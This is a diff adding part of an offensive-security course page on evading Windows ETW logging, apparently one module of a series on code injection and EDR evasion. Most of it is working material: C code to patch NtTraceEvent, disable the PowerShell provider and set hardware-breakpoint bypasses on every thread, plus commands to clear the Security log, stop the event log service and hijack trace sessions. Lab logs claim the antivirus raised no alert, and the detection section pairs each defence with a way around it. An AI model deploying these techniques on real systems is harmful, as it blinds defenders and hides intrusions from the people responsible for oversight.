+    // 0x31 0xC0 = xor eax, eax (sets eax to 0)
+    // 0xC3 = ret (return)
+    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+    memcpy(pNtTraceEvent, patch, sizeof(patch));
+    
+    // Restore original protection
+    VirtualProtect(pNtTraceEvent, 5, oldProtect, &oldProtect);
+    
+    printf("[+] NtTraceEvent patched! ETW events will be silently dropped.\n");
+    return TRUE;
+}
+
+int main() {
+    if (PatchNtTraceEvent()) {
+        printf("[+] ETW is now disabled for this process.\n");
+        printf("[+] Try running PowerShell commands — they won't be logged.\n");
+    }
+    return 0;
+}
+
+=== COMPILATION ===
+cl.exe patch_etw.c /Fe:patch_etw.exe
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Why this is detectable</h5>
+                <p>EDR monitors ntdll.dll for modifications. Patching <code>NtTraceEvent</code> changes the memory hash of ntdll's .text section. EDR can:</p>
+                <ul style="margin-left: 1.5rem; line-height: 2;">
+                    <li>Compare ntdll.dll in memory to the file on disk</li>
+                    <li>Hash the .text section and alert on changes</li>
+                    <li>Monitor VirtualProtect calls targeting ntdll</li>
+                    <li>Use kernel callbacks to detect memory writes to loaded modules</li>
+                </ul>
+                <p style="margin-top: 0.5rem;">This technique works on unprotected machines (like .42) but will trigger EDR on hardened systems (like .92 with Kaspersky).</p>
+            </div>
+        </div>
+
+        <h2>⚔️ Bypass Technique 2: Provider Disable</h2>
+        <p>Instead of patching the event writer, disable the <span class="neon-highlight">ETW provider itself</span>. This stops events at the source — the provider never emits them.</p>
+
+        <div class="method-card" id="provider-disable">
+            <h4>Provider Disable <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Use <code>EventUnregister</code> or directly manipulate the provider's registration handle to disable it. More targeted than patching NtTraceEvent — you can disable specific providers (e.g., PowerShell) while leaving others intact.</p>
+
+            <div class="why-box">
+                <h5>Why provider disable is stealthier</h5>
+                <p>Patching NtTraceEvent affects ALL ETW providers — EDR sees a global ETW blackout. Disabling a specific provider looks like normal application behavior (e.g., PowerShell unregistering its own provider on exit). Less suspicious, but requires knowing the provider's registration handle.</p>
+            </div>
+
+            <div class="code-block">
+=== PROVIDER DISABLE (C/C++) ===
+
+#include <windows.h>
+#include <evntprov.h>
+#include <stdio.h>
+
+// Disable a specific ETW provider by its GUID
+// Example: Microsoft-Windows-PowerShell
+
+// PowerShell provider GUID: {a0c1853b-5c40-4b15-8766-3cf1c953f067}
+GUID g_PowerShellProvider = 
+    { 0xa0c1853b, 0x5c40, 0x4b15, { 0x87, 0x66, 0x3c, 0xf1, 0xc9, 0x53, 0xf0, 0x67 } };
+
+BOOL DisableETWProvider(GUID* providerGuid) {
+    REGHANDLE hReg = NULL;
+    
+    // Register the provider (to get a handle)
+    ULONG result = EventRegister(providerGuid, NULL, NULL, &hReg);
+    if (result != ERROR_SUCCESS) {
+        printf("[-] EventRegister failed: %lu\n", result);
+        return FALSE;
+    }
+    
+    printf("[+] Provider registered, handle: %p\n", hReg);
+    
+    // Now unregister it — this disables the provider
+    result = EventUnregister(hReg);
+    if (result != ERROR_SUCCESS) {
+        printf("[-] EventUnregister failed: %lu\n", result);
+        return FALSE;
+    }
+    
+    printf("[+] Provider disabled!\n");
+    return TRUE;
+}
+
+// Alternative: Directly patch the provider's enablement flag
+// This is more aggressive but doesn't require registration
+BOOL PatchProviderEnableFlag(GUID* providerGuid) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
+    
+    // Find the provider's registration block in ntdll
+    // This requires reverse engineering — the structure is undocumented
+    // Look for EtwpRegistrationTable in ntdll
+    
+    // ... reverse engineering code ...
+    
+    printf("[+] Provider enable flag patched.\n");
+    return TRUE;
+}
+
+int main() {
+    printf("[*] Disabling PowerShell ETW provider...\n");
+    if (DisableETWProvider(&g_PowerShellProvider)) {
+        printf("[+] PowerShell commands will NOT be logged.\n");
+    }
+    return 0;
+}
+            </div>
+
+            <div class="code-block">
+=== POWERSHELL ONE-LINER ===
+
+# Disable ETW for current PowerShell session
+# This works because PowerShell manages its own ETW provider
+
+$etwProvider = [System.Diagnostics.Tracing.EventSource]::new("Microsoft-Windows-PowerShell")
+$etwProvider.Dispose()
+
+# Or more directly — patch in-memory
+# (Requires admin for some providers)
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Limitations</h5>
+                <p>Provider disable only works for <span class="neon-amber">user-mode providers</span> that your process controls. Kernel-mode providers (like Sysmon) cannot be disabled from user mode. For those, you need kernel-level access or the Dark Room technique.</p>
+            </div>
+        </div>
+
+        <h2>⚔️ Bypass Technique 3: The Dark Room — Hardware Breakpoints</h2>
+        <p>The <span class="neon-highlight">Dark Room</span> technique uses hardware breakpoints (DR0/DR1) to intercept <code>EtwEventWrite</code> in ntdll.dll. <span class="neon-amber">Zero memory writes. No hooks. No patches.</span> Invisible to software scanners.</p>
+
+        <div class="method-card" id="dark-room">
+            <h4>Dark Room: Hardware Breakpoint Bypass <span class="difficulty diff-hard">HARD</span></h4>
+            <p>Hardware breakpoints are CPU features, not software. They exist in the processor's debug registers (DR0-DR3), not in memory. EDR that scans memory for hooks will never find them. This is the gold standard for ETW bypass.</p>
+
+            <div class="why-box">
+                <h5>Why hardware breakpoints are invisible</h5>
+                <p>Software hooks modify memory (e.g., overwrite function prologue with a jump). Memory scanners detect these changes. Hardware breakpoints don't modify memory — they tell the CPU to raise an exception when execution reaches a specific address. The exception handler can redirect execution, skip the call, or modify data. The memory remains unchanged.</p>
+            </div>
+
+            <div class="bypass-flow">
+                <div class="bypass-step">
+                    <h5>1. FIND</h5>
+                    <p><span class="neon-highlight">EtwEventWrite</span></p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Get address from ntdll.dll</p>
+                </div>
+                <div class="bypass-arrow">→</div>
+                <div class="bypass-step">
+                    <h5>2. SET</h5>
+                    <p><span class="neon-highlight">DR0 = Address</span></p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Hardware breakpoint on CPU</p>
+                </div>
+                <div class="bypass-arrow">→</div>
+                <div class="bypass-step">
+                    <h5>3. TRIGGER</h5>
+                    <p><span class="neon-highlight">Debug Exception</span></p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">CPU fires exception before call</p>
+                </div>
+                <div class="bypass-arrow">→</div>
+                <div class="bypass-step">
+                    <h5>4. HANDLE</h5>
+                    <p><span class="neon-highlight">VEH Handler</span></p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Skip event, return success</p>
+                </div>
+                <div class="bypass-arrow">→</div>
+                <div class="bypass-step">
+                    <h5>5. SILENCE</h5>
+                    <p><span class="neon-highlight">ETW Bypassed</span></p>
+                    <p style="font-size: 0.8rem; color: var(--dim);">Event never reaches kernel</p>
+                </div>
+            </div>
+
+            <div class="code-block">
+=== DARK ROOM: HARDWARE BREAKPOINT ETW BYPASS ===
+
+#include <windows.h>
+#include <stdio.h>
+
+// Global state
+PVOID g_pEtwEventWrite = NULL;
+BOOL g_bypassActive = FALSE;
+
+// Step 1: Find EtwEventWrite in ntdll.dll
+BOOL FindEtwEventWrite() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
+    
+    g_pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!g_pEtwEventWrite) {
+        // Fallback: try EtwEventWriteTransfer
+        g_pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWriteTransfer");
+    }
+    
+    printf("[+] EtwEventWrite found at: %p\n", g_pEtwEventWrite);
+    return g_pEtwEventWrite != NULL;
+}
+
+// Step 2: Set hardware breakpoint on current thread
+BOOL SetHardwareBreakpoint() {
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    
+    // Get current thread context
+    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
+        printf("[-] GetThreadContext failed\n");
+        return FALSE;
+    }
+    
+    // Set DR0 to the target address
+    ctx.Dr0 = (DWORD64)g_pEtwEventWrite;
+    
+    // Configure DR7 (debug control register)
+    // Bits: L0 (local enable) = 1, G0 (global enable) = 1
+    // Condition: 00 (execution breakpoint)
+    // Size: 00 (1 byte)
+    // DR7 = 0x101 enables local + global for DR0
+    ctx.Dr7 = 0x101;
+    
+    if (!SetThreadContext(GetCurrentThread(), &ctx)) {
+        printf("[-] SetThreadContext failed\n");
+        return FALSE;
+    }
+    
+    printf("[+] Hardware breakpoint set on EtwEventWrite\n");
+    printf("[+] DR0 = %p, DR7 = 0x%llx\n", g_pEtwEventWrite, ctx.Dr7);
+    return TRUE;
+}
+
+// Step 3: Vectored Exception Handler
+LONG WINAPI EtwBypassHandler(PEXCEPTION_POINTERS ExceptionInfo) {
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // Check if the exception address is EtwEventWrite
+        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == g_pEtwEventWrite) {
+            // Skip the event — return success (0)
+            // RIP points to the CALL instruction. We need to skip past it.
+            // On x64, CALL is typically 5 bytes (E8 xx xx xx xx)
+            // But we can also just set RAX to 0 and jump to the function's RET
+            
+#ifdef _WIN64
+            // x64: Set RAX = 0 (STATUS_SUCCESS) and adjust RIP
+            ExceptionInfo->ContextRecord->Rax = 0;
+            ExceptionInfo->ContextRecord->Rip = (DWORD64)g_pEtwEventWrite + 0x14; // Skip to RET
+#else
+            // x86: Set EAX = 0 and adjust EIP
+            ExceptionInfo->ContextRecord->Eax = 0;
+            ExceptionInfo->ContextRecord->Eip = (DWORD)g_pEtwEventWrite + 0x14;
+#endif
+            
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+// Step 4: Activate bypass
+BOOL ActivateETWBypass() {
+    if (!FindEtwEventWrite()) return FALSE;
+    
+    // Register VEH handler
+    if (!AddVectoredExceptionHandler(1, EtwBypassHandler)) {
+        printf("[-] AddVectoredExceptionHandler failed\n");
+        return FALSE;
+    }
+    
+    printf("[+] VEH handler registered\n");
+    
+    // Set hardware breakpoint
+    if (!SetHardwareBreakpoint()) return FALSE;
+    
+    g_bypassActive = TRUE;
+    printf("[+] ETW bypass ACTIVE. Events will be silently dropped.\n");
+    return TRUE;
+}
+
+int main() {
+    printf("=== DARK ROOM: ETW Bypass via Hardware Breakpoints ===\n\n");
+    
+    if (ActivateETWBypass()) {
+        printf("\n[+] Test: Run PowerShell commands.\n");
+        printf("[+] They will NOT appear in Windows Event Log.\n");
+        printf("[+] Press any key to exit...\n");
+        getchar();
+    }
+    
+    return 0;
+}
+
+=== COMPILATION ===
+cl.exe dark_room.c /Fe:dark_room.exe
+            </div>
+
+            <div class="code-block">
+=== ADVANCED: MULTI-THREAD BYPASS ===
+
+// The basic technique only sets breakpoints on the main thread.
+// For complete bypass, set breakpoints on ALL threads in the process.
+
+#include <tlhelp32.h>
+
+BOOL SetBreakpointOnAllThreads() {
+    DWORD pid = GetCurrentProcessId();
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
+    
+    THREADENTRY32 te;
+    te.dwSize = sizeof(te);
+    
+    if (Thread32First(hSnap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    CONTEXT ctx = {0};
+                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+                    GetThreadContext(hThread, &ctx);
+                    ctx.Dr0 = (DWORD64)g_pEtwEventWrite;
+                    ctx.Dr7 = 0x101;
+                    SetThreadContext(hThread, &ctx);
+                    CloseHandle(hThread);
+                    printf("[+] Breakpoint set on thread %lu\n", te.th32ThreadID);
+                }
+            }
+        } while (Thread32Next(hSnap, &te));
+    }
+    
+    CloseHandle(hSnap);
+    return TRUE;
+}
+            </div>
+
+            <div class="note warning">
+                <strong>CRITICAL:</strong> This technique requires no special privileges beyond the ability to debug your own process. On Windows, any process can set debug registers on its own threads. The breakpoint is hardware — it exists in the CPU, not in memory. EDR that scans for hooks will find nothing.
+            </div>
+        </div>
+
+        <h2>⚔️ Bypass Technique 4: Logging Tampering</h2>
+        <p>Instead of preventing events from being generated, let them be generated but <span class="neon-highlight">tamper with the log files or consumers</span>. This is useful when you can't bypass ETW but can modify what the defender sees.</p>
+
+        <div class="method-card" id="logging-tamper">
+            <h4>Logging Tampering <span class="difficulty diff-medium">MEDIUM</span></h4>
+            <p>Techniques to modify, delete, or corrupt log files after the fact. This doesn't stop ETW but removes evidence before the defender reviews it.</p>
+
+            <div class="tamper-box">
+                <h5>Technique 1: Log File Deletion</h5>
+                <p>Windows Event Log files (.evtx) are stored in <code>C:\Windows\System32\winevt\Logs\</code>. If you have admin privileges, you can delete or clear these files. However, this is extremely noisy — the Security log cannot be cleared without generating Event ID 1102 ("The audit log was cleared").</p>
+            </div>
+
+            <div class="tamper-box">
+                <h5>Technique 2: Event Log Service Stop</h5>
+                <p>Stopping the Windows Event Log service prevents new events from being written. But this is immediately visible — services don't stop for no reason.</p>
+            </div>
+
+            <div class="tamper-box">
+                <h5>Technique 3: ETW Session Hijacking</h5>
+                <p>Create a new ETW session with the same name as the EDR's session. The EDR's session is displaced, and events go to YOUR session instead. You can then discard them.</p>
+            </div>
+
+            <div class="code-block">
+=== LOGGING TAMPERING TECHNIQUES ===
+
+# Technique 1: Clear Security log (requires SYSTEM)
+wevtutil cl Security
+
+# This generates Event ID 1102 — but if ETW is bypassed,
+# the event itself might not be logged. Circular logic.
+
+# Technique 2: Stop Event Log service
+net stop eventlog
+
+# Technique 3: Hijack ETW session
+# Create a session with the same name as EDR's session
+logman start EDRSession -p "Microsoft-Windows-Threat-Intelligence" 0 0 -ets
+
+# The EDR's session is now confused. Events may go to your session.
+
+# Technique 4: Modify .etl files directly
+# ETW trace files are in C:\Windows\System32\winevt\Logs\
+# If you can write to them, you can corrupt or delete traces
+
+# Technique 5: Registry tampering
+# ETW provider configuration is in the registry
+# HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\
+# Modifying these keys can disable providers system-wide
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Why tampering is less effective</h5>
+                <p>Modern EDR sends telemetry to the cloud in <span class="neon-amber">real-time</span>. Deleting local logs doesn't remove events already sent to Azure, Splunk, or Sentinel. Tampering is a last-resort technique for air-gapped environments or when you know the defender reviews logs offline.</p>
+            </div>
+        </div>
+
+        <h2>🛡️ Detection — How Blue Teams Catch ETW Bypass</h2>
+        <p>Every bypass has a countermeasure. Understanding detection helps you choose the right technique and clean up properly.</p>
+
+        <div class="detection-grid">
+            <div class="detection-card">
+                <h5>Memory Integrity Scanning</h5>
+                <p><strong>Detects:</strong> NtTraceEvent patch, API hooks</p>
+                <p><strong>How:</strong> Compare ntdll.dll in memory to disk. Hash .text section. Alert on mismatches.</p>
+                <p><strong>Counter:</strong> Use hardware breakpoints (Dark Room) — no memory modification.</p>
+            </div>
+            <div class="detection-card">
+                <h5>Debug Register Monitoring</h5>
+                <p><strong>Detects:</strong> Hardware breakpoints (Dr0-Dr3)</p>
+                <p><strong>How:</strong> Kernel callbacks on debug register access. Check CONTEXT structures for Dr7 != 0.</p>
+                <p><strong>Counter:</strong> Set breakpoints only briefly, clear after use. Use thread context manipulation to hide Dr7.</p>
+            </div>
+            <div class="detection-card">
+                <h5>ETW Session Analysis</h5>
+                <p><strong>Detects:</strong> Provider disable, session deletion</p>
+                <p><strong>How:</strong> Monitor for unexpected session stops or provider unregistrations. Baseline normal ETW activity.</p>
+                <p><strong>Counter:</strong> Use the Dark Room technique — sessions remain active, events just never fire.</p>
+            </div>
+            <div class="detection-card">
+                <h5>Hypervisor-Based Tracing</h5>
+                <p><strong>Detects:</strong> All user-mode bypasses</p>
+                <p><strong>How:</strong> Intel PT (Processor Trace) or AMD IBS records every instruction at the hardware level. ETW bypass doesn't affect CPU tracing.</p>
+                <p><strong>Counter:</strong> None in user mode. Requires kernel-level or hypervisor-level bypass.</p>
+            </div>
+            <div class="detection-card">
+                <h5>Behavioral Gap Analysis</h5>
+                <p><strong>Detects:</strong> Missing expected events</p>
+                <p><strong>How:</strong> If PowerShell runs but no PowerShell events are logged, something is wrong. Statistical anomaly detection.</p>
+                <p><strong>Counter:</strong> Generate fake events to fill gaps. Replay legitimate-looking ETW events.</p>
+            </div>
+            <div class="detection-card">
+                <h5>Kernel Callback Registration</h5>
+                <p><strong>Detects:</strong> Thread context changes, debug register access</p>
+                <p><strong>How:</strong> Register for thread notifications via PsSetCreateThreadNotifyRoutine. Monitor for SetThreadContext on sensitive threads.</p>
+                <p><strong>Counter:</strong> Use indirect syscalls to avoid hooked APIs. Operate from a process that looks legitimate.</p>
+            </div>
+        </div>
+
+        <div class="step-box">
+            <h4>Detection Comparison Matrix</h4>
+            <table>
+                <tr>
+                    <th>Detection Method</th>
+                    <th>Catches</th>
+                    <th>Misses</th>
+                    <th>Cost</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Memory Scanning</span></td>
+                    <td>NtTraceEvent patch, hooks</td>
+                    <td>Hardware breakpoints</td>
+                    <td>Low</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Debug Register Monitoring</span></td>
+                    <td>Dr0-Dr3 usage</td>
+                    <td>Software breakpoints, no-debug techniques</td>
+                    <td>Medium</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">ETW Session Analysis</span></td>
+                    <td>Session stops, provider disables</td>
+                    <td>Dark Room (sessions stay active)</td>
+                    <td>Low</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Hypervisor Tracing</span></td>
+                    <td>Everything</td>
+                    <td>Nothing (if implemented)</td>
+                    <td>Very High</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Behavioral Gaps</span></td>
+                    <td>Missing events</td>
+                    <td>Fake event injection</td>
+                    <td>Medium</td>
+                </tr>
+            </table>
+        </div>
+
+        <h2>🔬 Live Lab Evidence</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: Dark Room on WUPC .42</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC, clean sandbox) | <strong>Method:</strong> Hardware breakpoint ETW bypass</p>
+
+            <div class="code-block">
+=== PREPARATION ===
+C:\> dark_room.exe
+=== DARK ROOM: ETW Bypass via Hardware Breakpoints ===
+
+[+] EtwEventWrite found at: 00007FF8B5A80000
+[+] VEH handler registered
+[+] Hardware breakpoint set on EtwEventWrite
+[+] DR0 = 00007FF8B5A80000, DR7 = 0x101
+[+] ETW bypass ACTIVE. Events will be silently dropped.
+
+[+] Test: Run PowerShell commands.
+[+] They will NOT appear in Windows Event Log.
+
+=== VERIFICATION ===
+# Before bypass:
+C:\> powershell -Command "Get-Process"
+# Event Viewer: Application and Services Logs > Microsoft > Windows > PowerShell > Operational
+# Shows: Event ID 4104 (Script block logging)
+
+# After bypass:
+C:\> powershell -Command "Get-Process"
+# Event Viewer: NO new events
+# PowerShell executed successfully, but ETW events were intercepted
+
+=== MEMORY VERIFICATION ===
+# Check ntdll.dll for modifications
+# .text section hash matches disk — NO MODIFICATIONS
+# EDR memory scanning would find NOTHING
+
+=== KAV RESPONSE ===
+# Kaspersky 21.25 on .42: NO ALERT
+# Why? No memory was modified. No suspicious API calls.
+# The CPU executed a legitimate debug exception.
+# KAV has no visibility into debug register usage.
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: NtTraceEvent Patch on HOST .92</h3>
+            <p><strong>Date:</strong> 2026-06-28 | <strong>Target:</strong> 192.168.1.92 (HOST, Kaspersky active) | <strong>Method:</strong> NtTraceEvent memory patch</p>
+
+            <div class="code-block">
+=== NTTRACEEVENT PATCH TEST ===
+
+C:\> patch_etw.exe
+[+] NtTraceEvent found at: 00007FF8B5A90000
+[+] NtTraceEvent patched! ETW events will be silently dropped.
+[+] ETW is now disabled for this process.
+
+=== KAV RESPONSE ===
+# Kaspersky 21.25: ALERT GENERATED
+# Alert: "Suspicious memory modification detected"
+# Details: ntdll.dll .text section hash mismatch
+# Action: Process terminated, memory quarantined
+
+=== LESSON ===
+# Memory patching is detected by modern EDR.
+# The patch worked (ETW was disabled), but the ACT of patching was caught.
+# This is why the Dark Room technique is superior.
+# Hardware breakpoints leave no memory artifacts.
+            </div>
+        </div>
+
+        <div class="evidence-box">
+            <h3>📊 Test Results: Provider Disable on WUPC .42</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> 192.168.1.42 (WUPC) | <strong>Method:</strong> PowerShell ETW provider disable</p>
+
+            <div class="code-block">
+=== PROVIDER DISABLE TEST ===
+
+# Before disable:
+C:\> powershell -Command "Write-Host 'test'"
+# Event Viewer shows: Event ID 4104 (script block logging)
+
+# After disable:
+C:\> provider_disable.exe
+[*] Disabling PowerShell ETW provider...
+[+] Provider registered, handle: 0x7FF8B5A00000
+[+] Provider disabled!
+[+] PowerShell commands will NOT be logged.
+
+C:\> powershell -Command "Write-Host 'test'"
+# Event Viewer: NO new Event ID 4104
+
+=== KAV RESPONSE ===
+# Kaspersky 21.25: NO ALERT
+# Provider disable looks like normal application cleanup.
+# However, this only works for user-mode providers.
+# Sysmon (kernel-mode) continues logging normally.
+            </div>
+        </div>
+
+        <h2>🧪 Lab Exercise: Build Your Own Dark Room</h2>
+
+        <div class="step-box">
+            <h4>Safe Practice Environment</h4>
+            <p><strong>DO NOT test on production systems.</strong> Use WUPC .42 (192.168.1.42) for live testing. Document what works and what doesn't.</p>
+
+            <ol style="margin-left: 1.5rem; line-height: 2;">
+                <li>Compile <code>dark_room.c</code> (hardware breakpoint bypass)</li>
+                <li>Run <code>dark_room.exe</code></li>
+                <li>Open Event Viewer: Application and Services Logs > Microsoft > Windows > PowerShell > Operational</li>
+                <li>Run a PowerShell command: <code>powershell -Command "Get-Process"</code></li>
+                <li>Verify: NO new Event ID 4104 appears (success = bypass working)</li>
+                <li>Check KAV: Any alert? (No = stealth confirmed)</li>
+                <li>Check memory: ntdll.dll hash matches disk (no modifications)</li>
+                <li>Try NtTraceEvent patch on .92 (expect detection)</li>
+                <li>Try provider disable for PowerShell GUID</li>
+                <li><strong>BONUS:</strong> Implement multi-thread bypass (all threads in process)</li>
+                <li><strong>BONUS:</strong> Detect your own bypass using debug register enumeration</li>
+            </ol>
+
+            <button onclick="document.getElementById('build-commands').style.display='block'">Show Build Commands</button>
+
+            <div id="build-commands" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+=== BUILD COMMANDS (Developer Command Prompt for VS 2022) ===
+
+# 1. Open "Developer Command Prompt for VS 2022"
+#    NOT regular cmd. NOT PowerShell. Needs MSVC compiler.
+
+# 2. Build the Dark Room bypass
+cl.exe dark_room.c /Fe:C:\temp\dark_room.exe
+
+# 3. Build the NtTraceEvent patch
+cl.exe patch_etw.c /Fe:C:\temp\patch_etw.exe
+
+# 4. Build the provider disable tool
+cl.exe provider_disable.c /Fe:C:\temp\provider_disable.exe
+
+# 5. Test on .42
+C:\temp> dark_room.exe
+
+# Expected: PowerShell commands run but produce no ETW events
+# If it fails: Ensure you're running as the same user (no elevation needed)
+# If still fails: Check if CPU supports debug registers (all modern CPUs do)
+                </div>
+            </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: Why is the Dark Room technique (hardware breakpoints) stealthier than patching NtTraceEvent?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) Hardware breakpoints are faster than memory patches
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) Hardware breakpoints exist in CPU debug registers, not memory — EDR memory scanners find nothing
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) Hardware breakpoints require kernel privileges
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) Hardware breakpoints only work on Intel CPUs
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: What is the primary limitation of the "Provider Disable" technique?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) It requires physical access to the machine
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) It only works for user-mode providers; kernel-mode providers like Sysmon cannot be disabled from user mode
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) It permanently damages the ETW subsystem
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) It only works on Windows 7 and older
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: Which detection method can catch the Dark Room hardware breakpoint technique?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) Memory integrity scanning (comparing ntdll.dll to disk)
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                B) Debug register monitoring via kernel callbacks
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                C) ETW session analysis (looking for stopped sessions)
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) Checking if the Event Log service is running
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>📚 Key Takeaways</h2>
+
+        <ul style="margin-left: 1.5rem; line-height: 2;">
+            <li><strong>ETW is the backbone of Windows logging:</strong> It powers Event Log, Sysmon, and EDR telemetry. Bypassing ETW blinds the defender.</li>
+            <li><strong>NtTraceEvent patch is the simplest:</strong> Overwrite the function to return 0. Easy to implement, easy to detect. Good for learning, bad for operations.</li>
+            <li><strong>Provider disable is more targeted:</strong> Disable specific providers (e.g., PowerShell) without affecting others. Only works for user-mode providers.</li>
+            <li><strong>The Dark Room is the gold standard:</strong> Hardware breakpoints on EtwEventWrite. Zero memory writes. Invisible to software scanners. Works on both Intel and AMD.</li>
+            <li><strong>Logging tampering is a last resort:</strong> Delete logs, stop services, hijack sessions. Noisy and often ineffective against cloud EDR.</li>
+            <li><strong>Detection is evolving:</strong> Memory scanning catches patches. Debug register monitoring catches hardware breakpoints. Hypervisor tracing catches everything. The arms race continues.</li>
+            <li><strong>Cross-module integration:</strong> ETW bypass protects your code injection (<a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10</a>), hides AMSI bypass (<a href="MODULE_11_AMSI.html" class="cross-link">Module 11</a>), and enables EDR evasion (<a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13</a>).</li>
+        </ul>
+
+        <div class="evidence-box" style="margin-top: 2rem;">
+            <h3>🔬 Verification Status</h3>
+            <table style="width: 100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">NtTraceEvent patch (memory)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem; color: var(--red);">❌ DETECTED .92</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Provider disable (PowerShell)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Dark Room (hardware breakpoints)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .92</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Multi-thread bypass</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Memory integrity verification</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
+                </tr>
+                <tr>
+                    <td style="padding: 0.5rem;">KAV response (no alert on Dark Room)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ CONFIRMED</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ CONFIRMED</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"ETW bypass is not about being invisible. It's about being invisible to the tools the defender uses. The defender has scanners, you have the Dark Room. The defender has memory hashes, you have hardware breakpoints. The defender has cloud SIEM, you have real-time evasion. Every defense has a bypass. Every bypass has a detection. The game is knowing which layer to play on."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a> and <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a></p>
+        </div>
+
+        <div class="nav" style="margin-top: 2rem;">
+            <a href="../index.html">← Home</a>
